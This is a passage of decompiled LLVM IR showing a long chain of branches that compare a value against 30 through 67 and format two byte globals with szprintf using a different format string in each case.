dec_label_pc_b150:                                ; preds = %dec_label_pc_b144
  %v3_b15c = load i8, i8* @global_var_2c921.82, align 1
  %v3_b168 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b174 = sext i8 %v3_b15c to i32
  %v6_b174 = sext i8 %v3_b168 to i32
  %v8_b174 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a8ac.141 to i32), i32 %v4_b174, i32 %v6_b174, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b178

dec_label_pc_b178:                                ; preds = %dec_label_pc_b144, %dec_label_pc_b150
  %v7_b17c = icmp eq i32 %v2_ab54, 30
  br i1 %v7_b17c, label %dec_label_pc_b184, label %dec_label_pc_b1ac

dec_label_pc_b184:                                ; preds = %dec_label_pc_b178
  %v3_b190 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b19c = load i8, i8* @global_var_2c922.83, align 1
  %v4_b1a8 = sext i8 %v3_b190 to i32
  %v6_b1a8 = sext i8 %v3_b19c to i32
  %v8_b1a8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a8b8.143 to i32), i32 %v4_b1a8, i32 %v6_b1a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1ac

dec_label_pc_b1ac:                                ; preds = %dec_label_pc_b178, %dec_label_pc_b184
  %v7_b1b0 = icmp eq i32 %v2_ab54, 31
  br i1 %v7_b1b0, label %dec_label_pc_b1b8, label %dec_label_pc_b1e0

dec_label_pc_b1b8:                                ; preds = %dec_label_pc_b1ac
  %v3_b1c4 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b1d0 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b1dc = sext i8 %v3_b1c4 to i32
  %v6_b1dc = sext i8 %v3_b1d0 to i32
  %v8_b1dc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a8c8.145 to i32), i32 %v4_b1dc, i32 %v6_b1dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1e0

dec_label_pc_b1e0:                                ; preds = %dec_label_pc_b1ac, %dec_label_pc_b1b8
  %v7_b1e4 = icmp eq i32 %v2_ab54, 32
  br i1 %v7_b1e4, label %dec_label_pc_b1ec, label %dec_label_pc_b214

dec_label_pc_b1ec:                                ; preds = %dec_label_pc_b1e0
  %v3_b1f8 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b204 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b210 = sext i8 %v3_b1f8 to i32
  %v6_b210 = sext i8 %v3_b204 to i32
  %v8_b210 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1a8d4.147 to i32), i32 %v4_b210, i32 %v6_b210, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b214

dec_label_pc_b214:                                ; preds = %dec_label_pc_b1e0, %dec_label_pc_b1ec
  %v7_b218 = icmp eq i32 %v2_ab54, 33
  br i1 %v7_b218, label %dec_label_pc_b220, label %dec_label_pc_b248

dec_label_pc_b220:                                ; preds = %dec_label_pc_b214
  %v3_b22c = load i8, i8* @global_var_2c921.82, align 1
  %v3_b238 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b244 = sext i8 %v3_b22c to i32
  %v6_b244 = sext i8 %v3_b238 to i32
  %v8_b244 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a8e0.149 to i32), i32 %v4_b244, i32 %v6_b244, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b248

dec_label_pc_b248:                                ; preds = %dec_label_pc_b214, %dec_label_pc_b220
  %v7_b24c = icmp eq i32 %v2_ab54, 34
  br i1 %v7_b24c, label %dec_label_pc_b254, label %dec_label_pc_b27c

dec_label_pc_b254:                                ; preds = %dec_label_pc_b248
  %v3_b260 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b26c = load i8, i8* @global_var_2c922.83, align 1
  %v4_b278 = sext i8 %v3_b260 to i32
  %v6_b278 = sext i8 %v3_b26c to i32
  %v8_b278 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a8ec.151 to i32), i32 %v4_b278, i32 %v6_b278, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b27c

dec_label_pc_b27c:                                ; preds = %dec_label_pc_b248, %dec_label_pc_b254
  %v7_b280 = icmp eq i32 %v2_ab54, 35
  br i1 %v7_b280, label %dec_label_pc_b288, label %dec_label_pc_b2b0

dec_label_pc_b288:                                ; preds = %dec_label_pc_b27c
  %v3_b294 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b2a0 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b2ac = sext i8 %v3_b294 to i32
  %v6_b2ac = sext i8 %v3_b2a0 to i32
  %v8_b2ac = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a8f8.153 to i32), i32 %v4_b2ac, i32 %v6_b2ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2b0

dec_label_pc_b2b0:                                ; preds = %dec_label_pc_b27c, %dec_label_pc_b288
  %v7_b2b4 = icmp eq i32 %v2_ab54, 36
  br i1 %v7_b2b4, label %dec_label_pc_b2bc, label %dec_label_pc_b2e4

dec_label_pc_b2bc:                                ; preds = %dec_label_pc_b2b0
  %v3_b2c8 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b2d4 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b2e0 = sext i8 %v3_b2c8 to i32
  %v6_b2e0 = sext i8 %v3_b2d4 to i32
  %v8_b2e0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a904.155 to i32), i32 %v4_b2e0, i32 %v6_b2e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2e4

dec_label_pc_b2e4:                                ; preds = %dec_label_pc_b2b0, %dec_label_pc_b2bc
  %v7_b2e8 = icmp eq i32 %v2_ab54, 37
  br i1 %v7_b2e8, label %dec_label_pc_b2f0, label %dec_label_pc_b318

dec_label_pc_b2f0:                                ; preds = %dec_label_pc_b2e4
  %v3_b2fc = load i8, i8* @global_var_2c921.82, align 1
  %v3_b308 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b314 = sext i8 %v3_b2fc to i32
  %v6_b314 = sext i8 %v3_b308 to i32
  %v8_b314 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a910.157 to i32), i32 %v4_b314, i32 %v6_b314, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b318

dec_label_pc_b318:                                ; preds = %dec_label_pc_b2e4, %dec_label_pc_b2f0
  %v7_b31c = icmp eq i32 %v2_ab54, 38
  br i1 %v7_b31c, label %dec_label_pc_b324, label %dec_label_pc_b34c

dec_label_pc_b324:                                ; preds = %dec_label_pc_b318
  %v3_b330 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b33c = load i8, i8* @global_var_2c922.83, align 1
  %v4_b348 = sext i8 %v3_b330 to i32
  %v6_b348 = sext i8 %v3_b33c to i32
  %v8_b348 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a91c.159 to i32), i32 %v4_b348, i32 %v6_b348, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b34c

dec_label_pc_b34c:                                ; preds = %dec_label_pc_b318, %dec_label_pc_b324
  %v7_b350 = icmp eq i32 %v2_ab54, 39
  br i1 %v7_b350, label %dec_label_pc_b358, label %dec_label_pc_b380

dec_label_pc_b358:                                ; preds = %dec_label_pc_b34c
  %v3_b364 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b370 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b37c = sext i8 %v3_b364 to i32
  %v6_b37c = sext i8 %v3_b370 to i32
  %v8_b37c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a92c.161 to i32), i32 %v4_b37c, i32 %v6_b37c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b380

dec_label_pc_b380:                                ; preds = %dec_label_pc_b34c, %dec_label_pc_b358
  %v7_b384 = icmp eq i32 %v2_ab54, 40
  br i1 %v7_b384, label %dec_label_pc_b38c, label %dec_label_pc_b3b4

dec_label_pc_b38c:                                ; preds = %dec_label_pc_b380
  %v3_b398 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b3a4 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b3b0 = sext i8 %v3_b398 to i32
  %v6_b3b0 = sext i8 %v3_b3a4 to i32
  %v8_b3b0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a91c.159 to i32), i32 %v4_b3b0, i32 %v6_b3b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3b4

dec_label_pc_b3b4:                                ; preds = %dec_label_pc_b380, %dec_label_pc_b38c
  %v7_b3b8 = icmp eq i32 %v2_ab54, 41
  br i1 %v7_b3b8, label %dec_label_pc_b3c0, label %dec_label_pc_b3e8

dec_label_pc_b3c0:                                ; preds = %dec_label_pc_b3b4
  %v3_b3cc = load i8, i8* @global_var_2c921.82, align 1
  %v3_b3d8 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b3e4 = sext i8 %v3_b3cc to i32
  %v6_b3e4 = sext i8 %v3_b3d8 to i32
  %v8_b3e4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([11 x i8]* @global_var_1a93c.163 to i32), i32 %v4_b3e4, i32 %v6_b3e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3e8

dec_label_pc_b3e8:                                ; preds = %dec_label_pc_b3b4, %dec_label_pc_b3c0
  %v7_b3ec = icmp eq i32 %v2_ab54, 42
  br i1 %v7_b3ec, label %dec_label_pc_b3f4, label %dec_label_pc_b41c

dec_label_pc_b3f4:                                ; preds = %dec_label_pc_b3e8
  %v3_b400 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b40c = load i8, i8* @global_var_2c922.83, align 1
  %v4_b418 = sext i8 %v3_b400 to i32
  %v6_b418 = sext i8 %v3_b40c to i32
  %v8_b418 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a948.165 to i32), i32 %v4_b418, i32 %v6_b418, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b41c

dec_label_pc_b41c:                                ; preds = %dec_label_pc_b3e8, %dec_label_pc_b3f4
  %v7_b420 = icmp eq i32 %v2_ab54, 43
  br i1 %v7_b420, label %dec_label_pc_b428, label %dec_label_pc_b450

dec_label_pc_b428:                                ; preds = %dec_label_pc_b41c
  %v3_b434 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b440 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b44c = sext i8 %v3_b434 to i32
  %v6_b44c = sext i8 %v3_b440 to i32
  %v8_b44c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a954.167 to i32), i32 %v4_b44c, i32 %v6_b44c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b450

dec_label_pc_b450:                                ; preds = %dec_label_pc_b41c, %dec_label_pc_b428
  %v7_b454 = icmp eq i32 %v2_ab54, 44
  br i1 %v7_b454, label %dec_label_pc_b45c, label %dec_label_pc_b484

dec_label_pc_b45c:                                ; preds = %dec_label_pc_b450
  %v3_b468 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b474 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b480 = sext i8 %v3_b468 to i32
  %v6_b480 = sext i8 %v3_b474 to i32
  %v8_b480 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a964.169 to i32), i32 %v4_b480, i32 %v6_b480, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b484

dec_label_pc_b484:                                ; preds = %dec_label_pc_b450, %dec_label_pc_b45c
  %v7_b488 = icmp eq i32 %v2_ab54, 45
  br i1 %v7_b488, label %dec_label_pc_b490, label %dec_label_pc_b4b8

dec_label_pc_b490:                                ; preds = %dec_label_pc_b484
  %v3_b49c = load i8, i8* @global_var_2c921.82, align 1
  %v3_b4a8 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b4b4 = sext i8 %v3_b49c to i32
  %v6_b4b4 = sext i8 %v3_b4a8 to i32
  %v8_b4b4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a970.171 to i32), i32 %v4_b4b4, i32 %v6_b4b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4b8

dec_label_pc_b4b8:                                ; preds = %dec_label_pc_b484, %dec_label_pc_b490
  %v7_b4bc = icmp eq i32 %v2_ab54, 46
  br i1 %v7_b4bc, label %dec_label_pc_b4c4, label %dec_label_pc_b4ec

dec_label_pc_b4c4:                                ; preds = %dec_label_pc_b4b8
  %v3_b4d0 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b4dc = load i8, i8* @global_var_2c922.83, align 1
  %v4_b4e8 = sext i8 %v3_b4d0 to i32
  %v6_b4e8 = sext i8 %v3_b4dc to i32
  %v8_b4e8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a980.173 to i32), i32 %v4_b4e8, i32 %v6_b4e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4ec

dec_label_pc_b4ec:                                ; preds = %dec_label_pc_b4b8, %dec_label_pc_b4c4
  %v7_b4f0 = icmp eq i32 %v2_ab54, 47
  br i1 %v7_b4f0, label %dec_label_pc_b4f8, label %dec_label_pc_b520

dec_label_pc_b4f8:                                ; preds = %dec_label_pc_b4ec
  %v3_b504 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b510 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b51c = sext i8 %v3_b504 to i32
  %v6_b51c = sext i8 %v3_b510 to i32
  %v8_b51c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a990.175 to i32), i32 %v4_b51c, i32 %v6_b51c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b520

dec_label_pc_b520:                                ; preds = %dec_label_pc_b4ec, %dec_label_pc_b4f8
  %v7_b524 = icmp eq i32 %v2_ab54, 48
  br i1 %v7_b524, label %dec_label_pc_b52c, label %dec_label_pc_b554

dec_label_pc_b52c:                                ; preds = %dec_label_pc_b520
  %v3_b538 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b544 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b550 = sext i8 %v3_b538 to i32
  %v6_b550 = sext i8 %v3_b544 to i32
  %v8_b550 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a9a0.177 to i32), i32 %v4_b550, i32 %v6_b550, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b554

dec_label_pc_b554:                                ; preds = %dec_label_pc_b520, %dec_label_pc_b52c
  %v7_b558 = icmp eq i32 %v2_ab54, 49
  br i1 %v7_b558, label %dec_label_pc_b560, label %dec_label_pc_b588

dec_label_pc_b560:                                ; preds = %dec_label_pc_b554
  %v3_b56c = load i8, i8* @global_var_2c921.82, align 1
  %v3_b578 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b584 = sext i8 %v3_b56c to i32
  %v6_b584 = sext i8 %v3_b578 to i32
  %v8_b584 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a9ac.179 to i32), i32 %v4_b584, i32 %v6_b584, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b588

dec_label_pc_b588:                                ; preds = %dec_label_pc_b554, %dec_label_pc_b560
  %v7_b58c = icmp eq i32 %v2_ab54, 50
  br i1 %v7_b58c, label %dec_label_pc_b594, label %dec_label_pc_b5bc

dec_label_pc_b594:                                ; preds = %dec_label_pc_b588
  %v3_b5a0 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b5ac = load i8, i8* @global_var_2c922.83, align 1
  %v4_b5b8 = sext i8 %v3_b5a0 to i32
  %v6_b5b8 = sext i8 %v3_b5ac to i32
  %v8_b5b8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([12 x i8]* @global_var_1a9b8.181 to i32), i32 %v4_b5b8, i32 %v6_b5b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5bc

dec_label_pc_b5bc:                                ; preds = %dec_label_pc_b588, %dec_label_pc_b594
  %v7_b5c0 = icmp eq i32 %v2_ab54, 51
  br i1 %v7_b5c0, label %dec_label_pc_b5c8, label %dec_label_pc_b5f0

dec_label_pc_b5c8:                                ; preds = %dec_label_pc_b5bc
  %v3_b5d4 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b5e0 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b5ec = sext i8 %v3_b5d4 to i32
  %v6_b5ec = sext i8 %v3_b5e0 to i32
  %v8_b5ec = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a9c4.183 to i32), i32 %v4_b5ec, i32 %v6_b5ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5f0

dec_label_pc_b5f0:                                ; preds = %dec_label_pc_b5bc, %dec_label_pc_b5c8
  %v7_b5f4 = icmp eq i32 %v2_ab54, 52
  br i1 %v7_b5f4, label %dec_label_pc_b5fc, label %dec_label_pc_b624

dec_label_pc_b5fc:                                ; preds = %dec_label_pc_b5f0
  %v3_b608 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b614 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b620 = sext i8 %v3_b608 to i32
  %v6_b620 = sext i8 %v3_b614 to i32
  %v8_b620 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a9d4.185 to i32), i32 %v4_b620, i32 %v6_b620, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b624

dec_label_pc_b624:                                ; preds = %dec_label_pc_b5f0, %dec_label_pc_b5fc
  %v7_b628 = icmp eq i32 %v2_ab54, 53
  br i1 %v7_b628, label %dec_label_pc_b630, label %dec_label_pc_b658

dec_label_pc_b630:                                ; preds = %dec_label_pc_b624
  %v3_b63c = load i8, i8* @global_var_2c921.82, align 1
  %v3_b648 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b654 = sext i8 %v3_b63c to i32
  %v6_b654 = sext i8 %v3_b648 to i32
  %v8_b654 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1a9e4.187 to i32), i32 %v4_b654, i32 %v6_b654, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b658

dec_label_pc_b658:                                ; preds = %dec_label_pc_b624, %dec_label_pc_b630
  %v7_b65c = icmp eq i32 %v2_ab54, 54
  br i1 %v7_b65c, label %dec_label_pc_b664, label %dec_label_pc_b68c

dec_label_pc_b664:                                ; preds = %dec_label_pc_b658
  %v3_b670 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b67c = load i8, i8* @global_var_2c922.83, align 1
  %v4_b688 = sext i8 %v3_b670 to i32
  %v6_b688 = sext i8 %v3_b67c to i32
  %v8_b688 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1a9f4.189 to i32), i32 %v4_b688, i32 %v6_b688, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b68c

dec_label_pc_b68c:                                ; preds = %dec_label_pc_b658, %dec_label_pc_b664
  %v7_b690 = icmp eq i32 %v2_ab54, 55
  br i1 %v7_b690, label %dec_label_pc_b698, label %dec_label_pc_b6c0

dec_label_pc_b698:                                ; preds = %dec_label_pc_b68c
  %v3_b6a4 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b6b0 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b6bc = sext i8 %v3_b6a4 to i32
  %v6_b6bc = sext i8 %v3_b6b0 to i32
  %v8_b6bc = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1aa04.191 to i32), i32 %v4_b6bc, i32 %v6_b6bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6c0

dec_label_pc_b6c0:                                ; preds = %dec_label_pc_b68c, %dec_label_pc_b698
  %v7_b6c4 = icmp eq i32 %v2_ab54, 56
  br i1 %v7_b6c4, label %dec_label_pc_b6cc, label %dec_label_pc_b6f4

dec_label_pc_b6cc:                                ; preds = %dec_label_pc_b6c0
  %v3_b6d8 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b6e4 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b6f0 = sext i8 %v3_b6d8 to i32
  %v6_b6f0 = sext i8 %v3_b6e4 to i32
  %v8_b6f0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([14 x i8]* @global_var_1aa14.193 to i32), i32 %v4_b6f0, i32 %v6_b6f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6f4

dec_label_pc_b6f4:                                ; preds = %dec_label_pc_b6c0, %dec_label_pc_b6cc
  %v7_b6f8 = icmp eq i32 %v2_ab54, 57
  br i1 %v7_b6f8, label %dec_label_pc_b700, label %dec_label_pc_b728

dec_label_pc_b700:                                ; preds = %dec_label_pc_b6f4
  %v3_b70c = load i8, i8* @global_var_2c921.82, align 1
  %v3_b718 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b724 = sext i8 %v3_b70c to i32
  %v6_b724 = sext i8 %v3_b718 to i32
  %v8_b724 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1aa24.195 to i32), i32 %v4_b724, i32 %v6_b724, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b728

dec_label_pc_b728:                                ; preds = %dec_label_pc_b6f4, %dec_label_pc_b700
  %v7_b72c = icmp eq i32 %v2_ab54, 58
  br i1 %v7_b72c, label %dec_label_pc_b734, label %dec_label_pc_b75c

dec_label_pc_b734:                                ; preds = %dec_label_pc_b728
  %v3_b740 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b74c = load i8, i8* @global_var_2c922.83, align 1
  %v4_b758 = sext i8 %v3_b740 to i32
  %v6_b758 = sext i8 %v3_b74c to i32
  %v8_b758 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1aa34.197 to i32), i32 %v4_b758, i32 %v6_b758, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b75c

dec_label_pc_b75c:                                ; preds = %dec_label_pc_b728, %dec_label_pc_b734
  %v7_b760 = icmp eq i32 %v2_ab54, 59
  br i1 %v7_b760, label %dec_label_pc_b768, label %dec_label_pc_b790

dec_label_pc_b768:                                ; preds = %dec_label_pc_b75c
  %v3_b774 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b780 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b78c = sext i8 %v3_b774 to i32
  %v6_b78c = sext i8 %v3_b780 to i32
  %v8_b78c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1aa44.199 to i32), i32 %v4_b78c, i32 %v6_b78c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b790

dec_label_pc_b790:                                ; preds = %dec_label_pc_b75c, %dec_label_pc_b768
  %v7_b794 = icmp eq i32 %v2_ab54, 60
  br i1 %v7_b794, label %dec_label_pc_b79c, label %dec_label_pc_b7c4

dec_label_pc_b79c:                                ; preds = %dec_label_pc_b790
  %v3_b7a8 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b7b4 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b7c0 = sext i8 %v3_b7a8 to i32
  %v6_b7c0 = sext i8 %v3_b7b4 to i32
  %v8_b7c0 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1aa54.201 to i32), i32 %v4_b7c0, i32 %v6_b7c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b7c4

dec_label_pc_b7c4:                                ; preds = %dec_label_pc_b790, %dec_label_pc_b79c
  %v7_b7c8 = icmp eq i32 %v2_ab54, 61
  br i1 %v7_b7c8, label %dec_label_pc_b7d0, label %dec_label_pc_b7f8

dec_label_pc_b7d0:                                ; preds = %dec_label_pc_b7c4
  %v3_b7dc = load i8, i8* @global_var_2c921.82, align 1
  %v3_b7e8 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b7f4 = sext i8 %v3_b7dc to i32
  %v6_b7f4 = sext i8 %v3_b7e8 to i32
  %v8_b7f4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1aa64.203 to i32), i32 %v4_b7f4, i32 %v6_b7f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b7f8

dec_label_pc_b7f8:                                ; preds = %dec_label_pc_b7c4, %dec_label_pc_b7d0
  %v7_b7fc = icmp eq i32 %v2_ab54, 62
  br i1 %v7_b7fc, label %dec_label_pc_b804, label %dec_label_pc_b82c

dec_label_pc_b804:                                ; preds = %dec_label_pc_b7f8
  %v3_b810 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b81c = load i8, i8* @global_var_2c922.83, align 1
  %v4_b828 = sext i8 %v3_b810 to i32
  %v6_b828 = sext i8 %v3_b81c to i32
  %v8_b828 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1aa74.205 to i32), i32 %v4_b828, i32 %v6_b828, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b82c

dec_label_pc_b82c:                                ; preds = %dec_label_pc_b7f8, %dec_label_pc_b804
  %v7_b830 = icmp eq i32 %v2_ab54, 63
  br i1 %v7_b830, label %dec_label_pc_b838, label %dec_label_pc_b860

dec_label_pc_b838:                                ; preds = %dec_label_pc_b82c
  %v3_b844 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b850 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b85c = sext i8 %v3_b844 to i32
  %v6_b85c = sext i8 %v3_b850 to i32
  %v8_b85c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1aa84.207 to i32), i32 %v4_b85c, i32 %v6_b85c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b860

dec_label_pc_b860:                                ; preds = %dec_label_pc_b82c, %dec_label_pc_b838
  %v7_b864 = icmp eq i32 %v2_ab54, 64
  br i1 %v7_b864, label %dec_label_pc_b86c, label %dec_label_pc_b894

dec_label_pc_b86c:                                ; preds = %dec_label_pc_b860
  %v3_b878 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b884 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b890 = sext i8 %v3_b878 to i32
  %v6_b890 = sext i8 %v3_b884 to i32
  %v8_b890 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1aa94.209 to i32), i32 %v4_b890, i32 %v6_b890, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b894

dec_label_pc_b894:                                ; preds = %dec_label_pc_b860, %dec_label_pc_b86c
  %v7_b898 = icmp eq i32 %v2_ab54, 65
  br i1 %v7_b898, label %dec_label_pc_b8a0, label %dec_label_pc_b8c8

dec_label_pc_b8a0:                                ; preds = %dec_label_pc_b894
  %v3_b8ac = load i8, i8* @global_var_2c921.82, align 1
  %v3_b8b8 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b8c4 = sext i8 %v3_b8ac to i32
  %v6_b8c4 = sext i8 %v3_b8b8 to i32
  %v8_b8c4 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1aaa4.211 to i32), i32 %v4_b8c4, i32 %v6_b8c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b8c8

dec_label_pc_b8c8:                                ; preds = %dec_label_pc_b894, %dec_label_pc_b8a0
  %v7_b8cc = icmp eq i32 %v2_ab54, 66
  br i1 %v7_b8cc, label %dec_label_pc_b8d4, label %dec_label_pc_b8fc

dec_label_pc_b8d4:                                ; preds = %dec_label_pc_b8c8
  %v3_b8e0 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b8ec = load i8, i8* @global_var_2c922.83, align 1
  %v4_b8f8 = sext i8 %v3_b8e0 to i32
  %v6_b8f8 = sext i8 %v3_b8ec to i32
  %v8_b8f8 = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1aab4.213 to i32), i32 %v4_b8f8, i32 %v6_b8f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b8fc

dec_label_pc_b8fc:                                ; preds = %dec_label_pc_b8c8, %dec_label_pc_b8d4
  %v7_b900 = icmp eq i32 %v2_ab54, 67
  br i1 %v7_b900, label %dec_label_pc_b908, label %dec_label_pc_b930

dec_label_pc_b908:                                ; preds = %dec_label_pc_b8fc
  %v3_b914 = load i8, i8* @global_var_2c921.82, align 1
  %v3_b920 = load i8, i8* @global_var_2c922.83, align 1
  %v4_b92c = sext i8 %v3_b914 to i32
  %v6_b92c = sext i8 %v3_b920 to i32
  %v8_b92c = call i32 @szprintf(i32 %v2_aa80, i32 ptrtoint ([13 x i8]* @global_var_1aac4.215 to i32), i32 %v4_b92c, i32 %v6_b92c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b930

dec_label_pc_b930:                                ; preds = %dec_label_pc_b8fc, %dec_label_pc_b908
